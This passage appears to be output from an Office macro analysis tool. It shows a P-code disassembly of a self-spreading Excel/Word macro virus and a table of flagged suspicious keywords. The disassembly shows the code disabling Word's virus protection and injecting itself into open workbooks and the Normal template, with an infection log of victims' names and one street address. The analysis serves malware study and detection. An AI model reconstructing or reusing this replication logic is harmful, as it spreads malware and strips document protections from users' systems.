' 	Ld Application 
' 	MemLd UserName 
' 	St OTCSY 
' Line #120:
' 	StartForVariable 
' 	Ld YWSFYTAZWGTHVBN 
' 	EndForVariable 
' 	Ld QKCJXXBGERE 
' 	Ld YGOFCUNZCWFJ 
' 	FnLen 
' 	For 
' Line #121:
' 	Ld YGOFCUNZCWFJ 
' 	Ld YWSFYTAZWGTHVBN 
' 	Ld QKCJXXBGERE 
' 	ArgsLd Mid$ 0x0003 
' 	Ld RJHYJXBSELYZX 
' 	Ne 
' 	IfBlock 
' Line #122:
' 	Ld YGOFCUNZCWFJ 
' 	Ld YWSFYTAZWGTHVBN 
' 	Ld QKCJXXBGERE 
' 	ArgsLd Mid$ 0x0003 
' 	Ld JHQCGQSROAVOCT 
' 	Ne 
' 	IfBlock 
' Line #123:
' 	Ld YGOFCUNZCWFJTmp 
' 	Ld YGOFCUNZCWFJ 
' 	Ld YWSFYTAZWGTHVBN 
' 	Ld QKCJXXBGERE 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St YGOFCUNZCWFJTmp 
' Line #124:
' 	EndIfBlock 
' Line #125:
' 	ElseBlock 
' Line #126:
' 	Ld YGOFCUNZCWFJTmp 
' 	Ld RJHYJXBSELYZX 
' 	Concat 
' 	Ld GSGLJLEWZFMM 
' 	Concat 
' 	St YGOFCUNZCWFJTmp 
' Line #127:
' 	EndIfBlock 
' Line #128:
' 	StartForVariable 
' 	Ld YWSFYTAZWGTHVBN 
' 	EndForVariable 
' 	NextVar 
' Line #129:
' 	Ld TENMTXFWLOHWB 
' 	Ld RJHYJXBSELYZX 
' 	Concat 
' 	Ld GSGLJLEWZFMM 
' 	Concat 
' 	Ld FBCQLLDG 
' 	Concat 
' 	Ld RJHYJXBSELYZX 
' 	Concat 
' 	Ld GSGLJLEWZFMM 
' 	Concat 
' 	Ld OTCSY 
' 	Concat 
' 	Ld RJHYJXBSELYZX 
' 	Concat 
' 	Ld GSGLJLEWZFMM 
' 	Concat 
' 	Ld YGOFCUNZCWFJ 
' 	Concat 
' 	Ld RJHYJXBSELYZX 
' 	Concat 
' 	St TENMTXFWLOHWB 
' Line #130:
' 	EndSub 
' Line #131:
' 	FuncDefn (Private Sub LGVRXAM(ByVal TENMTXFWLOHWB As String))
' Line #132:
' 	OnError (Resume Next) 
' Line #133:
' 	Dim 
' 	VarDefn NVHMC (As Long)
' Line #134:
' 	Dim 
' 	VarDefn KZTYYQLI (As Object)
' Line #135:
' 	Dim 
' 	VarDefn QKWOSNNSETNBOLS
' 	VarDefn FFMKEFJJRVHP (As String)
' Line #136:
' 	LitStr 0x0045 "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
' 	St QKWOSNNSETNBOLS 
' Line #137:
' 	LitHI2 0x0000 
' 	St NVHMC 
' Line #138:
' 	LitStr 0x0008 "Options6"
' 	St FFMKEFJJRVHP 
' Line #139:
' 	Ld NVHMC 
' 	LitStr 0x0000 ""
' 	Ld QKWOSNNSETNBOLS 
' 	Ld FFMKEFJJRVHP 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #140:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0011 "Excel.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set KZTYYQLI 
' Line #141:
' 	Dim (Const) 
' 	LitDI2 0x0001 
' 	VarDefn QKCJXXBGERE
' 	LitDI2 0x0000 
' 	VarDefn ENLXFQYEBDGXIH
' Line #142:
' 	Dim 
' 	VarDefn DWGMWZKPXXPGKDZ (As String)
' Line #143:
' 	Dim 
' 	VarDefn YWSFYTAZWGTHVBN
' 	VarDefn PNXJERHBBO (As Integer)
' Line #144:
' 	LitStr 0x000C "ThisWorkbook"
' 	St DWGMWZKPXXPGKDZ 
' Line #145:
' 	StartForVariable 
' 	Ld YWSFYTAZWGTHVBN 
' 	EndForVariable 
' 	Ld QKCJXXBGERE 
' 	Ld KZTYYQLI 
' 	MemLd Application 
' 	MemLd Workbooks 
' 	MemLd Count 
' 	For 
' Line #146:
' 	StartForVariable 
' 	Ld PNXJERHBBO 
' 	EndForVariable 
' 	Ld QKCJXXBGERE 
' 	Ld YWSFYTAZWGTHVBN 
' 	Ld KZTYYQLI 
' 	MemLd Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #147:
' 	Ld PNXJERHBBO 
' 	Ld YWSFYTAZWGTHVBN 
' 	Ld KZTYYQLI 
' 	MemLd Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ENLXFQYEBDGXIH 
' 	Eq 
' 	IfBlock 
' Line #148:
' 	Ld QKCJXXBGERE 
' 	Ld TENMTXFWLOHWB 
' 	Ld PNXJERHBBO 
' 	Ld YWSFYTAZWGTHVBN 
' 	Ld KZTYYQLI 
' 	MemLd Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #149:
' 	Ld PNXJERHBBO 
' 	Ld YWSFYTAZWGTHVBN 
' 	Ld KZTYYQLI 
' 	MemLd Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	Ld DWGMWZKPXXPGKDZ 
' 	Eq 
' 	IfBlock 
' Line #150:
' 	LitDI2 0x0021 
' 	Ld QKCJXXBGERE 
' 	Mul 
' 	LitStr 0x0021 "Private Sub Workbook_Deactivate()"
' 	Ld PNXJERHBBO 
' 	Ld YWSFYTAZWGTHVBN 
' 	Ld KZTYYQLI 
' 	MemLd Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #151:
' 	ElseBlock 
' Line #152:
' 	Ld QKCJXXBGERE 
' 	LitDI2 0x0021 
' 	Mul 
' 	LitStr 0x0022 "Private Sub Worksheet_Deactivate()"
' 	Ld PNXJERHBBO 
' 	Ld YWSFYTAZWGTHVBN 
' 	Ld KZTYYQLI 
' 	MemLd Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #153:
' 	EndIfBlock 
' Line #154:
' 	EndIfBlock 
' Line #155:
' 	StartForVariable 
' 	Ld PNXJERHBBO 
' 	EndForVariable 
' 	NextVar 
' Line #156:
' 	StartForVariable 
' 	Ld YWSFYTAZWGTHVBN 
' 	EndForVariable 
' 	NextVar 
' Line #157:
' 	SetStmt 
' 	LitNothing 
' 	Set KZTYYQLI 
' Line #158:
' 	EndSub 
' Line #159:
' 	FuncDefn (Private Sub SMPYXIUJV(ByVal TENMTXFWLOHWB As String))
' Line #160:
' 	OnError (Resume Next) 
' Line #161:
' 	Dim (Const) 
' 	LitVarSpecial (True)
' 	VarDefn OYPSFPEV
' 	LitVarSpecial (False)
' 	VarDefn KEXIOVYRKXZ
' 	LitDI2 0x0001 
' 	VarDefn QKCJXXBGERE
' 	LitDI2 0x0000 
' 	VarDefn ENLXFQYEBDGXIH
' Line #162:
' 	Dim 
' 	VarDefn ZZVDDYDSZWZOKZ (As Object)
' Line #163:
' 	Dim 
' 	VarDefn QUBCNCNQKE (As Boolean)
' Line #164:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set ZZVDDYDSZWZOKZ 
' Line #165:
' 	Ld QKCJXXBGERE 
' 	Ld ZZVDDYDSZWZOKZ 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ENLXFQYEBDGXIH 
' 	Eq 
' 	IfBlock 
' Line #166:
' 	Ld ZZVDDYDSZWZOKZ 
' 	MemLd NormalTemplate 
' 	MemLd Saved 
' 	St QUBCNCNQKE 
' Line #167:
' 	Ld KEXIOVYRKXZ 
' 	Ld ZZVDDYDSZWZOKZ 
' 	MemLd Options 
' 	MemSt VirusProtection 
' Line #168:
' 	Ld QKCJXXBGERE 
' 	Ld TENMTXFWLOHWB 
' 	Ld QKCJXXBGERE 
' 	Ld ZZVDDYDSZWZOKZ 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #169:
' 	Ld QUBCNCNQKE 
' 	Ld OYPSFPEV 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ZZVDDYDSZWZOKZ 
' 	MemLd NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #170:
' 	EndIfBlock 
' Line #171:
' 	SetStmt 
' 	LitNothing 
' 	Set ZZVDDYDSZWZOKZ 
' Line #172:
' 	EndSub 
' Line #173:
' Line #174:
' 	QuoteRem 0x0000 0x0026 " 09:50:09: AM - Wednesday, 10 Feb 1999"
' Line #175:
' 	QuoteRem 0x0000 0x000B " Al Peabody"
' Line #176:
' 	QuoteRem 0x0000 0x0018 " 1634 Orchard Beach Road"
' Line #177:
' 	Reparse 0x0013 "Annapolis, MD 21401"
' Line #178:
' Line #179:
' 	QuoteRem 0x0000 0x0023 " 09:42:15: AM - Monday, 22 Feb 1999"
' Line #180:
' 	QuoteRem 0x0000 0x000F " Sergey Morozov"
' Line #181:
' 	QuoteRem 0x0000 0x0000 ""
' Line #182:
' Line #183:
' 	QuoteRem 0x0000 0x0024 " 09:49:26: AM - ÷åòâåðã, 11 ìàð 1999"
' Line #184:
' 	QuoteRem 0x0000 0x0008 " Advisor"
' Line #185:
' 	QuoteRem 0x0000 0x0000 ""
' Line #186:
' Line #187:
' 	QuoteRem 0x0000 0x0026 " 04:16:54:  - ïîíåäåëüíèê, 22 ìàð 1999"
' Line #188:
' 	QuoteRem 0x0000 0x0004 " ***"
' Line #189:
' 	QuoteRem 0x0000 0x0000 ""
' Line #190:
' Line #191:
' 	QuoteRem 0x0000 0x0022 " 11:52:11:  - ÷åòâåðã, 15 àïð 1999"
' Line #192:
' 	QuoteRem 0x0000 0x000E " Freddy Kruger"
' Line #193:
' 	QuoteRem 0x0000 0x0000 ""
' Line #194:
' Line #195:
' 	QuoteRem 0x0000 0x0022 " 11:45:13:  - âòîðíèê, 27 ìàé 1997"
' Line #196:
' 	QuoteRem 0x0000 0x0006 " MAXuS"
' Line #197:
' 	QuoteRem 0x0000 0x0000 ""
' Line #198:
' Line #199:
' 	QuoteRem 0x0000 0x0021 " 09:59:34:  - ñóááîòà, 3 èþí 1995"
' Line #200:
' 	QuoteRem 0x0000 0x0002 " 7"
' Line #201:
' 	QuoteRem 0x0000 0x0000 ""
' Line #202:
' Line #203:
' 	QuoteRem 0x0000 0x0021 " 08:02:29:  - ñóááîòà, 7 ôåâ 1998"
' Line #204:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #205:
' 	QuoteRem 0x0000 0x0000 ""
' Line #206:
' Line #207:
' 	QuoteRem 0x0000 0x0025 " 11:07:41:  - âîñêðåñåíüå, 8 ôåâ 1998"
' Line #208:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #209:
' 	QuoteRem 0x0000 0x0000 ""
' Line #210:
' Line #211:
' 	QuoteRem 0x0000 0x0025 " 01:34:29:  - ïîíåäåëüíèê, 9 ôåâ 1998"
' Line #212:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #213:
' 	QuoteRem 0x0000 0x0000 ""
' Line #214:
' Line #215:
' 	QuoteRem 0x0000 0x001F " 07:03:00:  - ñðåäà, 4 ôåâ 1998"
' Line #216:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #217:
' 	QuoteRem 0x0000 0x0000 ""
' Line #218:
' Line #219:
' 	QuoteRem 0x0000 0x0021 " 02:46:36:  - ñóááîòà, 4 ìàð 2000"
' Line #220:
' 	QuoteRem 0x0000 0x0005 " user"
' Line #221:
' 	QuoteRem 0x0000 0x0000 ""
' Line #222:
' Line #223:
' 	QuoteRem 0x0000 0x0021 " 11:17:37:  - ïÿòíèöà, 4 ÿíâ 1980"
' Line #224:
' 	QuoteRem 0x0000 0x0006 " Ñâåòà"
' Line #225:
' 	QuoteRem 0x0000 0x0000 ""
' Line #226:
' Line #227:
' 	QuoteRem 0x0000 0x0020 " 03:14:19:  - ñðåäà, 21 èþí 2000"
' Line #228:
' 	QuoteRem 0x0000 0x0005 " User"
' Line #229:
' 	QuoteRem 0x0000 0x0000 ""
' Line #230:
' Line #231:
' 	QuoteRem 0x0000 0x0025 " 12:41:56:  - âîñêðåñåíüå, 9 èþë 2000"
' Line #232:
' 	QuoteRem 0x0000 0x0005 " Ëåíà"
' Line #233:
' 	QuoteRem 0x0000 0x0000 ""
' Line #234:
' Line #235:
' 	QuoteRem 0x0000 0x0021 " 10:39:32:  - ñóááîòà, 2 ñåí 2000"
' Line #236:
' 	QuoteRem 0x0000 0x0005 " Ëåíà"
' Line #237:
' 	QuoteRem 0x0000 0x0000 ""
' Line #238:
' Line #239:
' 	QuoteRem 0x0000 0x0022 " 11.57.54.  - martedì, 10 ott 2000"
' Line #240:
' 	QuoteRem 0x0000 0x0004 " Èíà"
' Line #241:
' 	QuoteRem 0x0000 0x0000 ""
' Line #242:
' Line #243:
' 	QuoteRem 0x0000 0x0022 " 02:57:29:  - ÷åòâåðã, 19 îêò 2000"
' Line #244:
' 	QuoteRem 0x0000 0x0004 " Ina"
' Line #245:
' 	QuoteRem 0x0000 0x0000 ""
' Line #246:
' Line #247:
' 	QuoteRem 0x0000 0x0025 " 04:14:51:  - piektdiena, 12 Jan 2001"
' Line #248:
' 	QuoteRem 0x0000 0x000D " Sandra Kraze"
' Line #249:
' 	QuoteRem 0x0000 0x0000 ""
' Line #250:
' Line #251:
' 	QuoteRem 0x0000 0x0025 " 08:13:34: PM - Thursday, 25 Jan 2001"
' Line #252:
' 	QuoteRem 0x0000 0x0007 " Tester"
' Line #253:
' 	QuoteRem 0x0000 0x0000 ""
' Line #254:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

